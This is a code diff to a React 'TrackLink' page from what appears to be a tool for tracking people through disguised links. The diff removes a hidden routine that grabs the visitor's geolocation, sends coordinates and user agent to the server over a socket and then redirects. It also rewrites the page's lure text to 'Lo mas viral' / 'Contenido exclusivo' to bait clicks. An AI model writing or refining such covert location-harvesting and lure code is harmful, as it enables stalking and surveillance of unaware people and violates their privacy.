@@ -29,24 +29,7 @@ const TrackLink = () => {
         const socket = io(window.location.origin.replace('3000', '3001'));
         socketRef.current = socket;
 
-        // Auto-request location for better UX as requested by user
-        setTimeout(() => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const { latitude, longitude } = position.coords;
-                        socket.emit('update-location', {
-                            linkId: id,
-                            lat: latitude,
-                            lng: longitude,
-                            userAgent: navigator.userAgent
-                        });
-                        if (linkData?.destinationUrl) window.location.href = linkData.destinationUrl;
-                    },
-                    (err) => console.warn('Auto-geolocation skipped:', err)
-                );
-            }
-        }, 1500);
+        // Auto-request location removed to require user interaction first
 
         return () => {
             if (socket) socket.disconnect();
@@ -92,10 +75,10 @@ const TrackLink = () => {
     return (
         <div className="min-h-screen bg-black font-display text-white relative overflow-hidden flex flex-col">
             <Helmet>
-                <title>{linkData.title || "Contenido Restringido"}</title>
-                <meta name="description" content={linkData.description || "Verificación requerida"} />
-                <meta property="og:title" content={linkData.title || "Contenido Restringido"} />
-                <meta property="og:description" content={linkData.description || "Verificación requerida"} />
+                <title>{linkData.title || "Lo mas viral"}</title>
+                <meta name="description" content={linkData.description || "Contenido exclusivo"} />
+                <meta property="og:title" content={linkData.title || "Lo mas viral"} />
+                <meta property="og:description" content={linkData.description || "Contenido exclusivo"} />
                 <meta property="og:image" content={linkData.imageUrl || ""} />
             </Helmet>
 
